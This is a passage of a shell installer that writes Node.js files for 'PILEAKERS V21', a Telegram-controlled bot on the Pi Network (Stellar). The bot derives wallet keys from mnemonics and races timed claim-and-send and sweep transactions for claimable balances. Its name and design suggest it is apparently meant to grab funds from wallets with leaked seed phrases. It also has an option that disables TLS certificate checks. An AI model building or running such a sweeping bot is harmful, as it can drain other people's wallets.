                const latestLedger = Number.parseInt(transactions?._embedded?.records?.[0]?.ledger, 10);

                if (Number.isSafeInteger(latestLedger) && latestLedger > 0) {
                    return res.json({ start: Math.max(1, latestLedger - 10), end: latestLedger });
                }
                return res.json({ start: null, end: null });
            } catch (error) {
                return res.json({ start: null, end: null });
            }
        })
    );

    app.get(
        "/api/ledger/scan",
        ledgerAsyncHandler(async (req, res) => {
            const { wallet, ledger, ledgerEnd } = parseScanInput(req.query);
            const data = await fetchOperations(wallet, ledger, ledgerEnd);
            return res.json(data);
        })
    );

    app.get(
        "/api/ledger/download",
        ledgerAsyncHandler(async (req, res) => {
            const { wallet, ledger, ledgerEnd } = parseScanInput(req.query);
            const data = await fetchOperations(wallet, ledger, ledgerEnd);
            await writeLedgerWorkbook(res, data, ledger, ledgerEnd);
        })
    );
}

module.exports = registerLedgerRoutes;
module.exports.fetchOperations = fetchOperations;
module.exports.fetchSingleLedger = fetchSingleLedger;
PILEAKERS_LEDGER_JS

  backup_file "bump.txt"
  cat > "bump.txt" <<'PILEAKERS_BUMP_TXT'
# Tambahkan bump wallet dari Telegram: 💼 Manage Bump -> Add Bump / Upload bump.txt
PILEAKERS_BUMP_TXT

  backup_file "index.html"
  cat > "index.html" <<'PILEAKERS_INDEX_HTML'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PILEAKERS SERVER</title>
  <style>
    body { margin: 0; min-height: 100vh; display: grid; place-items: center; font-family: Arial, sans-serif; background: #07111f; color: #eaf2ff; }
    .card { max-width: 540px; padding: 28px; border-radius: 18px; background: #111d2d; box-shadow: 0 20px 60px rgba(0,0,0,.35); text-align: center; }
    h1 { margin: 0 0 10px; font-size: 26px; }
    p { line-height: 1.6; color: #b8c7dc; }
    code { background: #0a1320; padding: 3px 7px; border-radius: 8px; color: #9fe7ff; }
  </style>
</head>
<body>
  <main class="card">
    <h1>PILEAKERS V21</h1>
    <p>Mode ringan aktif. Dashboard web penuh sudah dinonaktifkan.</p>
    <p>Kontrol bot lewat Telegram dengan perintah <code>/menu</code>.</p>
  </main>
</body>
</html>

PILEAKERS_INDEX_HTML

  backup_file "index.js"
  cat > "index.js" <<'PILEAKERS_INDEX_JS'
require("dotenv").config();
const stellar = require("stellar-sdk");
const bip39 = require("bip39");
const edHd = require("ed25519-hd-key");
const express = require("express");
const { execSync } = require("child_process");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const http = require("http");
const https = require("https");
const axios = require("axios");
const { createClient } = require("redis");

if (process.env.ALLOW_INSECURE_TLS === "true") {
     process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = "0";
     console.warn(`[${process.env.WORKER_NAME || "Worker"}] WARNING: TLS certificate verification is disabled.`);
}
stellar.Config.setAllowHttp(true);

const app = express();
app.use(express.json());

function createRedisOptions() {
     if (process.env.REDIS_URL) {
          return { url: process.env.REDIS_URL };
     }
     if (process.env.REDIS_SOCKET) {
          return {
               socket: { path: process.env.REDIS_SOCKET },
               database: Number.parseInt(process.env.REDIS_DB || "0", 10),
          };
     }

     const options = {
          socket: {
               host: process.env.REDIS_HOST || "127.0.0.1",
               port: Number.parseInt(process.env.REDIS_PORT || "6379", 10),
          },
          database: Number.parseInt(process.env.REDIS_DB || "0", 10),
     };
     if (process.env.REDIS_USERNAME) {
          options.username = process.env.REDIS_USERNAME;
     }
     if (process.env.REDIS_PASSWORD) {
          options.password = process.env.REDIS_PASSWORD;
     }
     return options;
}

const redisClient = createClient(createRedisOptions());

redisClient.on("error", (err) => console.log("Redis Client Error", err));

const BOTS_KEY = "pileakers:bots";
const BOTS_WORKER_KEY_PREFIX = `${BOTS_KEY}:`;
const FEE_WALLETS_KEY = "pileakers:wallets";
const USERS_KEY = "pileakers:users";
const WORKERS_KEY = "pileakers:workers";
const SERVERS_KEY = "pileakers:servers";
const SETTINGS_KEY = "pileakers:settings";
const FUNDING_WALLET_STATE_KEY_PREFIX = "pileakers:funding-wallet-state:";
const FUNDING_WALLET_HISTORY_KEY_PREFIX = "pileakers:funding-wallet-history:";

const UPDATE_BOT_STATUS_SCRIPT = `
local data = redis.call("GET", KEYS[1])
if not data then
    return 0
end

local ok, bots = pcall(cjson.decode, data)
if not ok or type(bots) ~= "table" then
    return -1
end

for _, bot in ipairs(bots) do
    if tostring(bot["bot_name"] or "") == ARGV[1] then
        bot["status"] = ARGV[2]
        if ARGV[3] ~= "" then
            bot["last_message"] = ARGV[3]
        end
        bot["status_updated_at"] = ARGV[4]
        redis.call("SET", KEYS[1], cjson.encode(bots))
        return 1
    end
end

return 0
`;

const UPSERT_FUNDING_HISTORY_SCRIPT = `
local function normalize_int(value)
    local s = tostring(value or "0")
    s = string.gsub(s, "^0+", "")
    if s == "" then s = "0" end
    return s
end

local function greater_int_string(a, b)
    a = normalize_int(a)
    b = normalize_int(b)
    if string.len(a) ~= string.len(b) then
        return string.len(a) > string.len(b)
    end
    return a > b
end

local function add_unique(list, value)
    if not value or value == "" then return end
    for _, item in ipairs(list) do
        if tostring(item) == tostring(value) then return end
    end
    table.insert(list, value)
end

local current = {}
local raw = redis.call("GET", KEYS[1])
if raw then
    local ok, decoded = pcall(cjson.decode, raw)
    if ok and type(decoded) == "table" then current = decoded end
end

current.id = ARGV[1]
current.wallet_id = ARGV[2]
current.run_id = ARGV[3]
if ARGV[4] ~= "" then current.wallet_name = ARGV[4] end
if ARGV[5] ~= "" then current.wallet_public_key = ARGV[5] end
if ARGV[6] ~= "" then current.bot_group = ARGV[6] end
current.bot_names = current.bot_names or {}
current.workers = current.workers or {}
add_unique(current.bot_names, ARGV[7])
add_unique(current.workers, ARGV[8])
local incoming_before = normalize_int(ARGV[9])
local current_before = normalize_int(current.before_stroops or "0")
if current.before_stroops == nil or greater_int_string(incoming_before, current_before) then current.before_stroops = incoming_before end
current.after_stroops = normalize_int(ARGV[10])
local incoming_status = ARGV[11]
local current_status = tostring(current.status or "")
local incoming_success = incoming_status == "sent" or incoming_status == "claimed"
local current_success = current_status == "sent" or current_status == "claimed"
if incoming_status ~= "" and (incoming_success or not current_success) then current.status = incoming_status end
if ARGV[12] ~= "" then current.amount = ARGV[12] end
if ARGV[13] ~= "" then current.network = ARGV[13] end
if ARGV[14] ~= "" then current.transaction_type = ARGV[14] end
if not current.started_at or current.started_at == "" then current.started_at = ARGV[15] end
current.updated_at = ARGV[15]
redis.call("SET", KEYS[1], cjson.encode(current))
return 1
`;

const PORT = process.env.WORKER_PORT || 3001;
const WORKER_NAME = process.argv[2] || process.env.WORKER_NAME || "Worker1";
const WORKER_BOTS_KEY = getWorkerBotsKey(WORKER_NAME);
const WORKER_FEE_WALLETS_KEY = getWorkerDataKey(WORKER_NAME, "wallets");
const WORKER_USERS_KEY = getWorkerDataKey(WORKER_NAME, "users");
const WORKER_WORKERS_KEY = getWorkerDataKey(WORKER_NAME, "workers");
const WORKER_SERVERS_KEY = getWorkerDataKey(WORKER_NAME, "servers");
const SYNC_INTERVAL_MS = 5000;
const WEB_SERVICE_URL = String(process.env.WEB_SERVICE_URL || "http://localhost:3000")
     .trim()
     .replace(/\/+$/, "");

function logProcessError(label, error) {
     const detail = error?.stack || error?.message || String(error);
     console.error(`[${WORKER_NAME}] ${label}: ${detail}`);
}

process.on("uncaughtException", (error) => {
     logProcessError("Uncaught exception", error);
});

process.on("unhandledRejection", (reason) => {
     logProcessError("Unhandled rejection", reason);
});

function normalizeWorkerName(workerName) {
     const normalized = String(workerName || "").trim();
     return normalized || "Worker1";
}

function getWorkerBotsKey(workerName) {
     return `${BOTS_WORKER_KEY_PREFIX}${normalizeWorkerName(workerName)}`;
}

function getWorkerDataKey(workerName, dataName) {
     return `pileakers:worker-data:${normalizeWorkerName(workerName)}:${dataName}`;
}

function normalizeClaimableBalanceIds(value) {
     const items = Array.isArray(value) ? value : String(value || "").split(/[\s,;]+/);
     const seen = new Set();
     const ids = [];

     for (const item of items) {
          const id = String(item || "").trim();
          if (!id || seen.has(id)) {
               continue;
          }
          seen.add(id);
          ids.push(id);
     }

     return ids;
}

function getBotClaimableBalanceIds(bot) {
     const ids = normalizeClaimableBalanceIds(bot?.claimable_balance_ids);
     return ids.length ? ids : normalizeClaimableBalanceIds(bot?.claimable_balance_id);
}

function normalizeBotForStorage(bot) {
     const claimableBalanceIds = getBotClaimableBalanceIds(bot);

     return {
          ...bot,
          claimable_balance_id: claimableBalanceIds.length ? claimableBalanceIds.join(",") : null,
          claimable_balance_ids: claimableBalanceIds,
          worker_name: normalizeWorkerName(bot?.worker_name),
     };
}

function parsePositiveIntEnv(name, fallback, min = 1, max = Number.MAX_SAFE_INTEGER) {
     const raw = process.env[name];
     if (raw === undefined || raw === "") return fallback;
     const value = Number.parseInt(raw, 10);
     if (!Number.isFinite(value) || value < min || value > max) {
          console.warn(`[${WORKER_NAME}] Invalid ${name}=${raw}, using ${fallback}`);
          return fallback;
     }
     return value;
}

function parseSubmitHorizonLimitEnv(name, fallback = Number.POSITIVE_INFINITY) {
     const raw = process.env[name];
     if (raw === undefined || raw === "") return fallback;
     const normalized = String(raw).trim().toLowerCase();
     if (["0", "all", "unlimited", "unlimitid", "infinite", "none"].includes(normalized)) {
          return Number.POSITIVE_INFINITY;
     }
     const value = Number.parseInt(raw, 10);
     if (!Number.isFinite(value) || value < 1) {
          console.warn(`[${WORKER_NAME}] Invalid ${name}=${raw}, using unlimited`);
          return fallback;
     }
     return value;
}

function formatSubmitHorizonLimit(value) {
     return Number.isFinite(value) ? String(value) : "unlimited";
}

const LOAD_BEFORE_MS = parsePositiveIntEnv("LOAD_BEFORE_MS", 60000, 1000, 600000);
const BUILD_BEFORE_SEC = 25;
const BUILD_BEFORE_MS = parsePositiveIntEnv("BUILD_BEFORE_MS", BUILD_BEFORE_SEC * 1000, 1000, 600000);
const BUILD_AFTER_LOAD = String(process.env.BUILD_AFTER_LOAD || "false").trim().toLowerCase() !== "false";
let SUBMIT_BEFORE_MS = parsePositiveIntEnv("SUBMIT_BEFORE_MS", 2500, 0, 60000);
const HELPERS_PER_WORKER = parsePositiveIntEnv("HELPERS_PER_WORKER", 100, 1, 1000);
const SUBMIT_CONCURRENCY = parsePositiveIntEnv("SUBMIT_CONCURRENCY", HELPERS_PER_WORKER, 1, 1000);
const SUBMIT_WAVE_COUNT = parsePositiveIntEnv("SUBMIT_WAVE_COUNT", 1, 1, 5);
const SUBMIT_WAVE_DELAY_MS = parsePositiveIntEnv("SUBMIT_WAVE_DELAY_MS", 0, 0, 10000);
const SUBMIT_HTTP_MAX_SOCKETS = parsePositiveIntEnv("SUBMIT_HTTP_MAX_SOCKETS", 1500, 1, 5000);
const SUBMIT_HTTP_MAX_FREE_SOCKETS = parsePositiveIntEnv("SUBMIT_HTTP_MAX_FREE_SOCKETS", 256, 1, 2000);
const SUBMIT_HTTP_TIMEOUT_MS = parsePositiveIntEnv("SUBMIT_HTTP_TIMEOUT_MS", 15000, 500, 60000);
const TRANSACTION_TIMEOUT_MS = parsePositiveIntEnv("TRANSACTION_TIMEOUT_MS", 60000, 1000, 600000);
const SEQUENCE_MANAGER_ENABLED = String(process.env.SEQUENCE_MANAGER_ENABLED || "true").trim().toLowerCase() !== "false";
const SEQUENCE_RESERVATION_TTL_MS = parsePositiveIntEnv("SEQUENCE_RESERVATION_TTL_MS", 900000, 60000, 86400000);
const SEQUENCE_RESERVATION_KEY_PREFIX = "pileakers:sequence-reservation:";
let SUBMIT_ENDPOINT_MODE = String(process.env.SUBMIT_ENDPOINT_MODE || "async").trim().toLowerCase() === "sync" ? "sync" : "async";
const SUBMIT_VERBOSE_LOGS = process.env.SUBMIT_VERBOSE_LOGS === "true";
// Classic Submit Mode: meniru worker contoh — satu trigger submit, semua signed XDR ditembak Promise.all.
const CLASSIC_SUBMIT_TO_ALL_HORIZONS = String(process.env.CLASSIC_SUBMIT_TO_ALL_HORIZONS || "false").trim().toLowerCase() === "true";
const CLASSIC_SUBMIT_LOG_EACH_TX = String(process.env.CLASSIC_SUBMIT_LOG_EACH_TX || "false").trim().toLowerCase() === "true";
const SYNC_VERBOSE_LOGS = process.env.SYNC_VERBOSE_LOGS === "true";
const FAST_TICK_MS = parsePositiveIntEnv("FAST_TICK_MS", 1, 1, 1000);
const HORIZON_PING_TIMEOUT_MS = parsePositiveIntEnv("HORIZON_PING_TIMEOUT_MS", 5000, 500, 60000);
const MAX_SUBMIT_HORIZONS = parseSubmitHorizonLimitEnv("MAX_SUBMIT_HORIZONS", 1);
const WORKER_SERVER_ONLY = String(process.env.WORKER_SERVER_ONLY || "true").trim().toLowerCase() === "true";
const WEB_SERVICE_TIMEOUT_MS = parsePositiveIntEnv("WEB_SERVICE_TIMEOUT_MS", 3000, 500, 60000);
const WEB_SERVICE_RETRY_COUNT = parsePositiveIntEnv("WEB_SERVICE_RETRY_COUNT", 2, 0, 10);
const WEB_SERVICE_RETRY_DELAY_MS = parsePositiveIntEnv("WEB_SERVICE_RETRY_DELAY_MS", 500, 0, 10000);
const LOG_SEND_FAILURE_REPORT_INTERVAL_MS = parsePositiveIntEnv(
     "LOG_SEND_FAILURE_REPORT_INTERVAL_MS",
     60000,
     1000,
     3600000
);
const TOPUP_RETRY_COUNT = parsePositiveIntEnv("TOPUP_RETRY_COUNT", 5, 0, 10);
const TOPUP_RETRY_DELAY_MS = parsePositiveIntEnv("TOPUP_RETRY_DELAY_MS", 5000, 0, 300000);
const TOPUP_LOCK_WAIT_MS = parsePositiveIntEnv("TOPUP_LOCK_WAIT_MS", 120000, 1000, 600000);
const TOPUP_LOCK_TTL_MS = parsePositiveIntEnv("TOPUP_LOCK_TTL_MS", 180000, 10000, 900000);
const TOPUP_LOCK_RETRY_DELAY_MS = parsePositiveIntEnv("TOPUP_LOCK_RETRY_DELAY_MS", 1000, 100, 60000);
const TOPUP_CHECK_CONCURRENCY = parsePositiveIntEnv("TOPUP_CHECK_CONCURRENCY", 2, 1, 20);
const TOPUP_BATCH_SIZE = parsePositiveIntEnv("TOPUP_BATCH_SIZE", 100, 1, 100);
const TOPUP_BATCH_DELAY_MS = parsePositiveIntEnv("TOPUP_BATCH_DELAY_MS", 1500, 0, 300000);
const SWEEP_BATCH_SIZE = parsePositiveIntEnv("SWEEP_BATCH_SIZE", 15, 1, 15);
const SWEEP_BATCH_DELAY_MS = parsePositiveIntEnv("SWEEP_BATCH_DELAY_MS", 3000, 0, 300000);
const SWEEP_RETRY_COUNT = parsePositiveIntEnv("SWEEP_RETRY_COUNT", 3, 0, 10);
const SWEEP_RETRY_DELAY_MS = parsePositiveIntEnv("SWEEP_RETRY_DELAY_MS", 3000, 0, 300000);
const SWEEP_CONCURRENCY = parsePositiveIntEnv("SWEEP_CONCURRENCY", SWEEP_BATCH_SIZE, 1, 15);
const BASE_OPERATION_FEE_STROOPS = 100000n;
const PI_STROOPS_PER_UNIT = 10000000n;
const TOPUP_BASE_BALANCE_STROOPS = parsePiAmountToStroops(
     process.env.TOPUP_BASE_BALANCE || "1.0",
     "TOPUP_BASE_BALANCE"
);
const SWEEP_RESERVE_STROOPS = parsePiAmountToStroops(
     process.env.SWEEP_RESERVE_BALANCE || "0.99",
     "SWEEP_RESERVE_BALANCE"
);
const HELPER_LOAD_CONCURRENCY = parsePositiveIntEnv("HELPER_LOAD_CONCURRENCY", 4, 1, 50);
const HELPER_LOAD_RETRY_COUNT = parsePositiveIntEnv("HELPER_LOAD_RETRY_COUNT", 5, 0, 10);
const HELPER_LOAD_RETRY_DELAY_MS = parsePositiveIntEnv("HELPER_LOAD_RETRY_DELAY_MS", 1000, 0, 300000);
const HORIZON_REQUEST_DELAY_MS = parsePositiveIntEnv("HORIZON_REQUEST_DELAY_MS", 150, 0, 60000);
const HORIZON_RATE_LIMIT_COOLDOWN_MS = parsePositiveIntEnv("HORIZON_RATE_LIMIT_COOLDOWN_MS", 20000, 1000, 600000);
const HORIZON_RATE_LIMIT_JITTER_MS = parsePositiveIntEnv("HORIZON_RATE_LIMIT_JITTER_MS", 500, 0, 60000);

// Shared keep-alive submit pool. Ini padanan Node.js untuk requests.Session + HTTPAdapter
// pada contoh Python: koneksi TCP/TLS dipakai ulang, bukan dibuat ulang untuk setiap TX.
const SUBMIT_HTTP_AGENT = new http.Agent({
     keepAlive: true,
     keepAliveMsecs: 1000,
     maxSockets: SUBMIT_HTTP_MAX_SOCKETS,
     maxFreeSockets: SUBMIT_HTTP_MAX_FREE_SOCKETS,
});
const SUBMIT_HTTPS_AGENT = new https.Agent({
     keepAlive: true,
     keepAliveMsecs: 1000,
     maxSockets: SUBMIT_HTTP_MAX_SOCKETS,
     maxFreeSockets: SUBMIT_HTTP_MAX_FREE_SOCKETS,
});
const SUBMIT_HTTP_CLIENT = axios.create({
     timeout: SUBMIT_HTTP_TIMEOUT_MS,
     httpAgent: SUBMIT_HTTP_AGENT,
     httpsAgent: SUBMIT_HTTPS_AGENT,
     maxRedirects: 0,
     validateStatus: () => true,
});

function generateWorkerRandomMemo() {
     const chars = "abcdefghijklmnopqrstuvwxyz0123456789ba1d9fe1659896652b17a6d8bc44b00a8e37d49e51ea689e33cea9e8f737c08";
     const prefixes = [
  "0x", "0x"
];
     const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
     let randomPart = "";
     for (let i = 0; i < 14; i++) {
          randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
     }
     return `${prefix}0${randomPart}`;
}

function loadSponsorsFromFile(filePath) {
     try {
          const resolved = path.resolve(__dirname, filePath);
          const content = fs.readFileSync(resolved, "utf8");
          const lines = content
               .split("\n")
               .map((line) => line.trim())
               .filter((line) => line.length > 0 && !line.startsWith("#"));
          console.log(`[${WORKER_NAME}] 📦 Loaded ${lines.length} fee bump sponsors from ${filePath}`);
          return lines;
     } catch (error) {
          console.error(`[${WORKER_NAME}] ❌ Failed to load sponsors from ${filePath}: ${error.message}`);
          return [];
     }
}

const FEE_BUMP_SPONSORS = loadSponsorsFromFile("bump.txt");

async function loadRedisData(key) {
     try {
          const data = await redisClient.get(key);
          return data ? JSON.parse(data) : [];
     } catch (error) {
          console.error(`[${WORKER_NAME}] Error reading ${key} from Redis: ${error.message}`);
          return [];
     }
}

async function saveRedisData(key, data) {
     try {
          await redisClient.set(key, JSON.stringify(data));
     } catch (error) {
          console.error(`[${WORKER_NAME}] Error writing to ${key} in Redis: ${error.message}`);
     }
}

async function migrateLegacyBotsForWorker() {
     const legacyBots = await loadRedisData(BOTS_KEY);
     const myLegacyBots = legacyBots.map(normalizeBotForStorage).filter((bot) => bot.worker_name === WORKER_NAME);

     if (!myLegacyBots.length) {
          return 0;
     }

     const workerBots = await loadRedisData(WORKER_BOTS_KEY);
     const existingNames = new Set(workerBots.map((bot) => String(bot?.bot_name || "")).filter(Boolean));
     const additions = myLegacyBots.filter((bot) => {
          const botName = String(bot?.bot_name || "");
          return botName && !existingNames.has(botName);
     });

     if (!additions.length) {
          return 0;
     }

     await saveRedisData(WORKER_BOTS_KEY, [...workerBots.map(normalizeBotForStorage), ...additions]);
     workerLog(`Migrated ${additions.length} legacy bot(s) into ${WORKER_BOTS_KEY}.`, "info");
     return additions.length;
}

function getFeeDivisor(transactionType, claimableCount = 0, transactionMode = "fee_bump") {
     if (transactionMode === "normal") {
          return 1;
     }
     if (transactionType === "claim_and_send") {
          return Math.max(3, claimableCount + 2);
     }
     if (transactionType === "claim_only") {
          return Math.max(2, claimableCount + 1);
     }
     return 2;
}

function getEffectiveFee(outerFee, transactionType, claimableCount = 0, transactionMode = "fee_bump") {
     const fee = parseFloat(outerFee);
     if (!Number.isFinite(fee) || fee <= 0) {
          throw new Error(`Invalid outer fee: ${outerFee}`);
     }
     return fee / getFeeDivisor(transactionType, claimableCount, transactionMode);
}

function getNormalModeBaseFeeStroops(totalFee, operationCount) {
     const fee = parseFloat(totalFee);
     if (!Number.isFinite(fee) || fee <= 0 || !Number.isSafeInteger(operationCount) || operationCount < 1) {
          throw new Error(`Invalid normal mode fee: ${totalFee}`);
     }
     return Math.floor((fee / operationCount) * 1e7).toString();
}

function getEstimatedFeeChargedStroops(operationCount, transactionMode) {
     if (!Number.isSafeInteger(operationCount) || operationCount < 1) {
          throw new Error(`Invalid operation count: ${operationCount}`);
     }
     const feeUnits = operationCount + (transactionMode === "fee_bump" ? 1 : 0);
     return BigInt(feeUnits) * BASE_OPERATION_FEE_STROOPS;
}

function parsePiAmountToStroops(value, label = "amount") {
     const text = String(value ?? "").trim();
     if (!/^\d+(?:\.\d{1,7})?$/.test(text)) {
          throw new Error(`Invalid ${label}: ${value}`);
     }

     const [wholePart, fractionalPart = ""] = text.split(".");
     const wholeStroops = BigInt(wholePart) * PI_STROOPS_PER_UNIT;
     const fractionalStroops = BigInt(fractionalPart.padEnd(7, "0"));
     return wholeStroops + fractionalStroops;
}

function formatPiStroops(stroops) {
     const wholePart = stroops / PI_STROOPS_PER_UNIT;
     const fractionalPart = (stroops % PI_STROOPS_PER_UNIT).toString().padStart(7, "0");
     return `${wholePart}.${fractionalPart}`;
}

function stripTransactionPreconditions(tx) {
     if (!tx?._tx || typeof tx._tx.cond !== "function" || !stellar.xdr?.Preconditions?.precondNone) {
          throw new Error("Unable to remove transaction preconditions");
     }

     tx._tx.cond(stellar.xdr.Preconditions.precondNone());
     return tx;
}

function applyTransactionBounds(txBuilder, minTime, maxTime) {
     // Pakai timebounds saja supaya transaksi tidak terkunci ke ledger tertentu.
     txBuilder.setTimebounds(minTime, maxTime);
     return txBuilder;
}

function resolveTopupTargetBalance(topupTargetBalance, outerFee) {
     const configuredTarget = String(topupTargetBalance ?? "").trim();
     const rawTargetStroops = configuredTarget
          ? parsePiAmountToStroops(configuredTarget, "topup target balance")
          : parsePiAmountToStroops(outerFee, "outer fee") + 100000n;

     if (rawTargetStroops <= 0n) {
          throw new Error(`Invalid topup target balance: ${configuredTarget || outerFee}`);
     }

     return rawTargetStroops < TOPUP_BASE_BALANCE_STROOPS
          ? TOPUP_BASE_BALANCE_STROOPS + rawTargetStroops
          : rawTargetStroops;
}

function getNativeBalanceStroops(account) {
     const nativeBalance = account.balances.find((balance) => balance.asset_type === "native");
     return nativeBalance ? parsePiAmountToStroops(nativeBalance.balance, "native balance") : 0n;
}

function sleep(ms) {
     return new Promise((resolve) => setTimeout(resolve, ms));
}

function addJitter(ms) {
     if (ms <= 0 || HORIZON_RATE_LIMIT_JITTER_MS <= 0) {
          return ms;
     }
     return ms + crypto.randomInt(HORIZON_RATE_LIMIT_JITTER_MS + 1);
}

function chunkArray(items, size) {
     const chunks = [];
     for (let index = 0; index < items.length; index += size) {
          chunks.push(items.slice(index, index + size));
     }
     return chunks;
}

function buildHelperNumberBatches(items, batchSize) {
     const numberedGroups = new Map();
     const unnumberedItems = [];

     for (const item of items) {
          const helperNumber = Number(item.helperNumber);
          if (!Number.isSafeInteger(helperNumber) || helperNumber < 1) {
               unnumberedItems.push(item);
               continue;
          }

          const start = Math.floor((helperNumber - 1) / batchSize) * batchSize + 1;
          const end = start + batchSize - 1;
          const key = `${start}-${end}`;
          if (!numberedGroups.has(key)) {
               numberedGroups.set(key, { start, end, items: [] });
          }
          numberedGroups.get(key).items.push(item);
     }

     const batches = [...numberedGroups.values()]
          .sort((a, b) => a.start - b.start)
          .map((batch) => ({
               ...batch,
               items: batch.items.sort((a, b) => Number(a.helperNumber) - Number(b.helperNumber)),
          }));

     for (const chunk of chunkArray(unnumberedItems, batchSize)) {
          batches.push({ start: null, end: null, items: chunk });
     }

     return batches;
}

async function mapWithConcurrency(items, concurrency, mapper) {
     const results = new Array(items.length);
     let cursor = 0;
     const workerCount = Math.min(Math.max(1, concurrency), items.length);

     await Promise.all(
          Array.from({ length: workerCount }, async () => {
               while (cursor < items.length) {
                    const index = cursor;
                    cursor += 1;
                    results[index] = await mapper(items[index], index);
               }
          })
     );

     return results;
}

function normalizeHorizonUrls(horizonUrls) {
     const values = Array.isArray(horizonUrls) ? horizonUrls : [horizonUrls];
     const seen = new Set();
     const urls = [];
     for (const value of values) {
          const normalized = String(value || "").trim().replace(/\/+$/, "");
          if (!normalized || !/^https?:\/\//i.test(normalized)) {
               continue;
          }
          const key = normalized.toLowerCase();
          if (seen.has(key)) {
               continue;
          }
          seen.add(key);
          urls.push(normalized);
     }
     return urls;
}

function pickHorizonUrl(horizonUrls, index = 0) {
     const urls = normalizeHorizonUrls(horizonUrls);
     if (urls.length === 0) {
          throw new Error("No Horizon URL available");
     }
     return urls[index % urls.length];
}

function getHttpErrorStatus(error) {
     const status = error?.response?.status || error?.status || error?.statusCode;
     if (Number.isFinite(Number(status))) {
          return Number(status);
     }
     const statusMatch = String(error?.message || "").match(/status code (\d{3})/i);
     return statusMatch ? Number(statusMatch[1]) : null;
}

function isRateLimitError(error) {
     const status = getHttpErrorStatus(error);
     return status === 429 || /status code 429|too many requests|rate limit/i.test(String(error?.message || ""));
}

function isRetryableHorizonError(error) {
     const status = getHttpErrorStatus(error);
     return isRateLimitError(error) || status === 408 || status === 504 || (status >= 500 && status <= 599);
}

function getRetryAfterMs(error) {
     const headers = error?.response?.headers || error?.headers || {};
     const retryAfter = headers["retry-after"] || headers["Retry-After"];
     if (!retryAfter) {
          return 0;
     }

     const seconds = Number.parseFloat(retryAfter);
     if (Number.isFinite(seconds) && seconds >= 0) {
          return Math.ceil(seconds * 1000);
     }

     const retryAt = Date.parse(retryAfter);
     return Number.isFinite(retryAt) ? Math.max(0, retryAt - Date.now()) : 0;
}

function getRetryDelayMs(error, attempt, fallbackDelayMs) {
     const linearDelay = fallbackDelayMs * (attempt + 1);
     if (isRateLimitError(error)) {
          return addJitter(Math.max(linearDelay, getRetryAfterMs(error), HORIZON_RATE_LIMIT_COOLDOWN_MS));
     }
     return addJitter(linearDelay);
}

function getHorizonThrottleKey(horizonUrl) {
     const hash = crypto
          .createHash("sha1")
          .update(String(horizonUrl || ""))
          .digest("hex");
     return `pileakers:horizon:cooldown:${normalizeWorkerName(WORKER_NAME)}:${hash}`;
}

const horizonQueues = new Map();
const horizonNextAllowedAt = new Map();
const horizonThrottleLogAt = new Map();

function maybeLogHorizonThrottle(botName, horizonUrl, message, type = "warning") {
     const key = `${horizonUrl}:${message}`;
     const now = Date.now();
     if ((horizonThrottleLogAt.get(key) || 0) + 5000 <= now) {
          horizonThrottleLogAt.set(key, now);
          workerLog(`[${botName}] ${message}`, type);
     }
}

async function getHorizonCooldownMs(horizonUrl) {
     if (!redisClient.isOpen) {
          return 0;
     }

     try {
          const until = Number(await redisClient.get(getHorizonThrottleKey(horizonUrl)));
          return Number.isFinite(until) ? Math.max(0, until - Date.now()) : 0;
     } catch (error) {
          return 0;
     }
}

async function markHorizonRateLimited(horizonUrl, waitMs) {
     const cooldownMs = Math.max(waitMs, HORIZON_RATE_LIMIT_COOLDOWN_MS);
     const until = Date.now() + cooldownMs;
     horizonNextAllowedAt.set(horizonUrl, until);

     if (redisClient.isOpen) {
          try {
               await redisClient.set(getHorizonThrottleKey(horizonUrl), String(until), {
                    PX: cooldownMs,
               });
          } catch (error) {
              
          }
     }

     return cooldownMs;
}

async function waitForHorizonSlot(horizonUrl, botName, label) {
     const redisWaitMs = await getHorizonCooldownMs(horizonUrl);
     if (redisWaitMs > 0) {
          maybeLogHorizonThrottle(
               botName,
               horizonUrl,
               `${label} menunggu cooldown Horizon ${redisWaitMs}ms karena rate limit.`,
               "warning"
          );
          await sleep(redisWaitMs);
     }

     const localWaitMs = Math.max(0, (horizonNextAllowedAt.get(horizonUrl) || 0) - Date.now());
     if (localWaitMs > 0) {
          await sleep(localWaitMs);
     }

     if (HORIZON_REQUEST_DELAY_MS > 0) {
          horizonNextAllowedAt.set(horizonUrl, Date.now() + HORIZON_REQUEST_DELAY_MS);
     }
}

async function horizonRequest(horizonUrl, action, label, botName) {
     const url = String(horizonUrl || "default");
     const previous = horizonQueues.get(url) || Promise.resolve();
     const queued = previous
          .catch(() => {})
          .then(async () => {
               await waitForHorizonSlot(url, botName, label);
               try {
                    return await action();
               } catch (error) {
                    if (isRateLimitError(error)) {
                         const cooldownMs = await markHorizonRateLimited(url, getRetryAfterMs(error));
                         maybeLogHorizonThrottle(
                              botName,
                              url,
                              `${label} kena 429. Horizon di-cooldown ${cooldownMs}ms sebelum request berikutnya.`,
                              "warning"
                         );
                    }
                    throw error;
               }
          });

     horizonQueues.set(url, queued);
     queued
          .finally(() => {
               if (horizonQueues.get(url) === queued) {
                    horizonQueues.delete(url);
               }
          })
          .catch(() => {});

     return queued;
}

async function retryRateLimited(action, label, botName, retries, delayMs) {
     for (let attempt = 0; attempt <= retries; attempt++) {
          try {
               return await action();
          } catch (error) {
               if (!isRetryableHorizonError(error) || attempt >= retries) {
                    throw error;
               }
               const waitMs = getRetryDelayMs(error, attempt, delayMs);
               const status = getHttpErrorStatus(error) || "unknown";
               workerLog(
                    `[${botName}] ${label} kena error sementara HTTP ${status}. Retry ${attempt + 1}/${retries} dalam ${waitMs}ms...`,
                    "warning"
               );
               if (waitMs > 0) {
                    await sleep(waitMs);
               }
          }
     }
     throw new Error(`${label} failed`);
}

function getStellarTransactionHash(transaction) {
     try {
          const hash = transaction.hash();
          return Buffer.isBuffer(hash) ? hash.toString("hex") : String(hash);
     } catch (error) {
          return null;
     }
}

function getHorizonResultCodes(error) {
     return error?.response?.data?.extras?.result_codes || null;
}

function formatHorizonError(error) {
     const resultCodes = getHorizonResultCodes(error);
     return resultCodes ? `${error.message} ${JSON.stringify(resultCodes)}` : error.message;
}

async function findSubmittedTransaction(server, transactionHash, horizonUrl = null, botName = WORKER_NAME) {
     if (!transactionHash) {
          return null;
     }

     try {
          const action = () => server.transactions().transaction(transactionHash).call();
          return horizonUrl
